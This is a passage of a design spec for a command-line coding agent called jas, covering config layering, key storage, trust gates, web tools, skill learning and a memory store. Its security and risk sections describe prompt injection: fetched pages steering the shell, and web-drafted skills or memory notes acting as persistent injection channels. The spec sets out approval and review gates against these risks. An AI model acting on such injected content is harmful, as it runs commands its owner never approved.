├── config.local.json          # personal prefs (gitignore) — overrides project
├── farm.yaml                  # project farm config
├── scenario.yaml              # planned: runtime policy only (§8) — NOT prefs
├── hooks/                     # planned: project hook scripts
├── sessions/                  # live session records, <id>.json (git-excluded)
└── worktrees/                 # farm worktrees (git-excluded)

<project>/AGENTS.md            # project instructions (#8)
```

**Prefs resolution** (Claude 3-way; shipped):

```
CLI flag > JAS_* env vars > <project>/.jas/config.local.json
         > <project>/.jas/config.json > ~/.jas/profiles/<name>/config.json
         > ~/.jas/config.json > built-in defaults
```

The **profile layer** is the active profile's `config.json`, between project
and global. The profile is chosen by `--profile` > `JAS_PROFILE` > local >
project > global > `default` (project only once trusted). A profile cannot set
`provider`, `base_url`, `search_base_url`, `profile` or `providers.*`: those
are dropped with a warning, so endpoints stay global-only. The profile's
`AGENTS.md` loads before the project's, and its `skills/` folder is the only
user skill source besides jas's built-in manual (installed under
`<UserCacheDir>/jas/manual/`); `~/.agents/skills`, `~/.claude/skills` and
`~/.config/jas/skills` are no longer read. Reference: `docs/manual.md`
(Profiles).

`jas config list` and chat `/settings` label each value with its source
(`flag`, `env JAS_*`, `local config`, `project config`, `profile config (<name>)`, `global config`,
`default`). CLI `jas config set|unset` defaults to **global** for compat;
`/settings` defaults to **local**. Scope flags: `--global|--in-profile|--project|--local`.

**Scenario / policy resolution** (§8.1; later) stays separate from prefs.
Maps merge key-by-key; lists use pi's `+name`/`-name` add/remove semantics.
Do **not** dump prefs into `scenario.yaml`.

Per-model overrides live in each config layer under `models`. Named
endpoints are `providers.<name>` entries in the global config, addressed as
`<name>/<model>` ([providers.md](providers.md)).

First-run onboarding, every `jas config` / `jas auth` command, the full
settings key list and their `JAS_*` / `--<k>` forms are in the manual. There
is deliberately **no `--api-key` flag**: argv shows up in shell history and
`ps`. Keys come from `auth.json`, an `$ENV` reference, or `JAS_API_KEY`.

**Key management rules:**

- `auth.json` stores either a literal key (chmod 0600, `JAS_NO_PLAINTEXT_KEYS=1`
  refuses to write it) or a `$ENV_NAME` reference resolved at launch — so the
  key can live in a password manager/env instead of on disk.
- Keys NEVER appear in config.json or scenario files (§9's blind
  secret access consumes them by name only).
- `jas auth` subcommand: list/add/remove/rotate keys; never echoes values.
- Per-endpoint key resolution: the provider entry's key → `auth.json` name → env var.

**What env vars still do:** transient overrides just below CLI flags
(`JAS_MODEL`, `JAS_BASE_URL`, `JAS_API_KEY` beat project and global config).
They are for CI and containers, where there is no `~/.jas/` to configure.
Persistent config lives in `~/.jas/` and is managed with `jas config` /
`jas auth`.

**Session storage** stays simple: `~/.jas/sessions/<id>/events.jsonl` (§3) is
the whole story — no DB, replay = tail the file. Farm state lives in
`~/.jas/farms/<farm-id>/` (plan, supervisor log, board, manifest, one event
log per part); worktrees live in the repo's git-excluded `.jas/worktrees/`; see the farm spec.

## 11. Security acceptance and project trust

The shipped layers are pinned by tests that run in CI: the secrets fixture
(§9), redaction including false-positive corpora (#7), the shell env
allowlist and path confinement, the resume contract (#4), the trust gate,
and the approval ladder (each level gates exactly its row in §3.1; no TTY →
exit 5). Shell stays YOLO + `--approve`; containers are the isolation answer
(#1).

**Planned — project trust extended to scenarios:** the gate (§3) also covers a
project `.jas/scenario.yaml` that declares hooks or MCP servers. The cache key
in `~/.jas/trust.json` becomes project path **plus a hash of the context files,
the scenario file and the hook scripts it names**, so a `git pull` that changes
any of them asks again. The hash does **not** cover what a hook calls in turn
(`make`, other scripts, binaries on `PATH`). This is a startup gate only, not a
security boundary (pi's model). It exists because scenarios carry executable
hooks.

**Untrusted content raises the default gate (shipped for `web_tools`).**
Fetched pages can carry prompt injection; under a `never` default, that
injection could drive `shell`. So a session with web tools enabled runs at
`shell` unless `never` was set explicitly by flag or config. Scenarios that
enable web tools will follow the same rule.

## 12. Web access & learning (v2/v3)

### 12.1 Web access (pi's answer: core stays thin, an extension package adds it)

pi ships no web tool in core: the model runs `curl` through `bash`, or the
**pi-web-access** extension adds search/fetch with keyless providers in its
fallback chain and remote providers behind an explicit opt-in. jas follows
the same idea (see #11):

- **Shipped, opt-in:** in-tree Go tools, enabled only when
  `web_tools=true` in layered settings (default off). Chat and `jas run`
  register them via `tools.SessionTools`. When enabled and `approve` is still
  the built-in default, the session approve level rises to `shell` unless the
  user set `never` explicitly (§11).
  - `web_fetch <url>` — **pure** HTTP GET → HTML stripped to plain text
    (pure Go, `x/net/html`). Size/timeout capped. No cloning, no side effects
    beyond the GET. Kind = ReadOnly.
  - `web_search <query>` — pluggable `Searcher` chain. If `search_base_url` is
    set, SearXNG JSON is tried first; otherwise DuckDuckGo lite (keyless HTML).
    Brave/Tavily and paid `apiKeyEnv` providers are deferred.
  - `git_clone <url> [dest]` — **deferred**. Explicit shallow clone,
    path-confined to the session dir; not a special case of `web_fetch`.
- Provider chain today: SearXNG (when `search_base_url` set) → DuckDuckGo.
  Future: configurable `search.providers` list with paid backends.
- Search providers are a tiny interface, not a dependency:
  `Search(ctx, q, limit) []Result`.
- Redaction middleware (§9) applies to tool output → web content is scrubbed
  like any other tool result before it enters the transcript.
- PDF/video understanding is **v3+** (remote servers need API keys); v2 keeps
  to fetch + search (+ clone later).

### 12.2 `jas learn <topic>` — research → skill

The user story: "jas, learn X and remember it for next time." Runs as a normal
agent session with a scenario that gives it: web_search + web_fetch + skill_write.

```
jas learn "how to write a uv venv workflow"      # interactive
jas learn --auto "topic"                         # non-interactive → pending queue
```

Flow: agent researches (§12.1 tools) → drafts `SKILL.md` + `references/` per the
agentskills.io spec (same as pi, so skills interop across Claude Code/Hermes)
→ shows the draft for approval → saves to the active profile's `skills/` or project
`.agents/skills/<name>/` (the directories jas scans; reads and writes are
lifted past the `~/.jas/**` deny floor only under the active profile's
`skills/`, and writes there always prompt). The skill is then advertised to future sessions
(name + description only; full instructions load on demand — pi's model).

Guardrails:

- A skill is instructions injected into **every future session**. A skill
  drafted from web content is therefore a persistent prompt-injection channel.
  `--auto` never installs. It writes drafts to `~/.jas/skills-pending/<name>/`,
  which are never advertised. `jas skills review` shows the draft and its
  source URLs; `jas skills approve <name>` installs it.
- `learn` never overwrites an existing skill without `--force`.
- `jas skills list` shows what's installed (and pending); `jas skills rm <name>`.

### 12.3 Memory & dreaming (memory store and dreaming shipped)

Anthropic's 2026-11 [agent memory](https://www.anthropic.com/research/components-of-agent-memory)
write-up (and the walkthroughs of it) split memory into four layers: raw
session transcripts, in-session scratch notes, linked topic notes, and a short
index that is injected at the start of a session. Dreaming is idle-time
cleanup of that store, checked against the transcripts. jas already has the
bottom layer — the versioned JSONL event log at
`~/.jas/sessions/<id>/events.jsonl`. This section is the plan for the other
three, plus a reviewed `jas dream`. It is not a plan to wrap Anthropic's
managed-agents Dreams API, and it is not a background AutoDream-style daemon.

**What memory is for.** A note is worth keeping only if a future session
cannot rediscover it by reading the repo, and would otherwise repeat a
mistake: a correction, a hard-won lesson, or why plan A was chosen over plan
B. Project state that is already in the tree is not memory; writing it down
goes stale and then gets trusted.

**Layers, mapped to jas.**

| Layer | Where | How it is loaded |
|---|---|---|
| 1. Transcripts | `~/.jas/sessions/<id>/events.jsonl` (already global; do not move) | not injected; the ground truth a dream verifies against |
| 2–3. Scratch and topic notes | `~/.jas/profiles/<name>/memory/`, with `projects/<key>/` for notes about one project | read on demand; notes may link to each other (progressive disclosure) |
| 4. Index | `MEMORY.md` in that dir | injected at session start, hard-capped (first 200 lines or 25 KB) |

`AGENTS.md` stays the owner-written handbook. Skills stay stable, approved
workflows. Memory is the draft pad between them: the model may write there
during a session; it may not rewrite the handbook or a skill on the fly.
Writes are path-confined to the memory dirs, with the same symlink and
jas-home overlap guards as the active profile's `skills/` (#173), and writes
there always prompt. Memory belongs to the owner, not a repo (owner,
2026-11-12): it holds who they are, how they work, project management and
references, so it lives only under the profile and never in a cloned tree.
Behavior: `docs/manual.md` (Memory).

**`jas dream`** (shipped). After the event-log spec is published and the memory store
exists, `jas dream` reads recent event logs plus the current store and writes
a *proposed* reorganization: stale facts corrected against the log, duplicates
merged, the index pruned back under the cap. The default is a new store or a
diff, not an in-place rewrite of the live dir. The owner approves before it
replaces the store; the run is itself an event. The command may *flag*
promotion candidates (this note looks like a skill; this one looks like an
`AGENTS.md` rule) and must not edit those files. A scheduled run, if added
later, only prepares the proposal.

**Promotion (v3).** Once a note has been verified and has recurred, the owner
graduates it: into a skill if it is a repeatable workflow, into `AGENTS.md` if
it is a hard rule. That is the same approval bar as `jas learn` (§12.2).

**Order and non-goals.** Track C in §5. Compaction is not memory. Session
awareness is not memory, but memory writes should honor it once it ships.
The event-log spec it waited on is published ([event-log.md](event-log.md)).

## 13. Risks

- **API compat drift** — pin to chat-completions + SSE via a provider-neutral
  message/event layer (#5); Anthropic-style deltas stay inside the adapter.
  Test against OpenRouter AND ollama. Retry/backoff on 429/5xx; SSE idle timeout.
- **SSE delta reassembly** — tool-call chunks split differently per provider
  (OpenAI, Anthropic-style, vLLM); the accumulator is fuzzed against recorded
  streams, and new providers need new recordings.
- **Sandbox safety** — v1 shell is YOLO (§3.1 / #1); `--approve` is the gate;
  containers are the isolation answer. Document loudly; do not claim
  command-string deny is a boundary.
- **Scope creep** — no fullscreen TUI, no blueprints (#9); farm stays
  experimental. Kill features, not quality.
- **Context / cost runaway** — jas tracks prompt tokens, elides old tool
  results in chunks, compacts in the chat, and clean-stops on
  `context_length_exceeded` (#2). `jas run --max-tokens/--timeout` are
  checked **before** each request (exit 7); farm adds a farm-wide total, an
  integrator reserve and a shared rate limiter (farm spec, Budgets). Usage is
  logged per request.
- **Memory drift** — a model-written `MEMORY.md` is injected into later
  sessions, so a wrong or stale note (or a note drafted from untrusted
  content) becomes a persistent prompt-injection channel, the same risk
  already called out for `jas learn` (§12.2). Mitigation: keep the injected
  index small, store only durable lessons, require owner approval of
  `jas dream`, and never let a dream edit `AGENTS.md` or skills.
- **Deny-list gaps** — deny semantics are regex/path-glob based and will have
  blind spots (novel secret formats; shell commands that read files indirectly,
  e.g. `python -c`). Symlinks are handled by resolving paths before matching
  (§3). Mitigation: the redaction middleware is the backstop, containers are
  the isolation answer, and the fixture-corpus + real-repo FP tests run on
  every release (#7).

## 14. jas vs pi

pi (`badlogic/pi-mono`) is the closest peer and the main reference for this
design. The full feature audit is in
[research/pi-mono-audit.md](research/pi-mono-audit.md). This table compares
the parts a user sees in jas today (later work marked) against a local pi install
(`~/.pi/agent/`, pi 1.4).

| Area | pi | jas | Why jas differs |
|---|---|---|---|
| Runtime | Node/TypeScript | single static Go binary | no runtime to install; goroutines fit the farm |
| Config storage | `~/.pi/agent/settings.json` (`defaultProvider`, `defaultModel`, packages) | `~/.jas/config.json` | same model |
| Setting config | TUI: `/model` saves the default, `pi config` toggles resources | `jas config set/get/unset/list`, first-run onboarding; `/model` picker Ctrl+S stores the default | config is scriptable, no TUI needed; the inline picker adds the shortcut |
| Keys | `auth.json` via `/login` (incl. OAuth); env vars as fallback; `--api-key` flag | `auth.json` (0600) or `$ENV` reference via `jas auth`; `JAS_API_KEY` fallback; **no `--api-key` flag** | argv leaks to shell history and `ps` |
| Model catalog | `models-store.json` with context window, costs, thinking levels | compiled-in catalog + `models.<name>.context_window` override; named `providers.<name>` | needed for the context budget |
| Override order | CLI flag > settings > env fallback | CLI flag > `JAS_*` > local > project > profile > global > defaults | env sits above stored config so CI can override without touching `~/.jas/` |
| Modes | text, `--mode json`, `--mode rpc` | inline chat, `jas run`, `--json`; RPC over stdio + Unix socket later | the socket enables `attach` from another terminal |
| Tool approval | none built in (YOLO; gating via extensions) | `--approve=never\|shell\|mutating` ladder, exit 5 without a TTY | gate exists in core so CI can rely on it |
| Project trust | `--approve`/`-a` trusts project-local files; `--no-context-files` | trust gate on `AGENTS.md`/`CLAUDE.md` and project skills, later scenarios; `--trust-project` | note the flag clash: pi's `--approve` means *trust*, jas's means *tool gating* |
| Context | auto-compaction (summary at `window − reserve`) | chunked tool-result elision + clean stop; the same compaction in the chat | elision is the cheap floor |
| Sessions | JSONL tree, `--continue` / `--resume` / `--fork` | versioned JSONL events with `parent_id`; resume (`--continue`, `/resume`); fork later | write-ahead `tool_started` for at-most-once side effects |
| Parallelism | one session per process (tmux for more) | `jas sessions` records; `jas farm` (experimental): one task split into parts, worktree per part, integrator, supervisor-run `check` | farm only pays on decomposable work |
| Extensibility | TS extensions, npm/git packages, skills, prompt templates, MCP | `Tool` interface, `SKILL.md` skills; MCP, hooks + scenarios later | no plugin ABI in Go; scenarios are data |
| Secrets | `auth.json`, keys out of settings | four layers (§9): deny floor, output redaction, redacted log; blind access later | redaction is the backstop for YOLO shell |
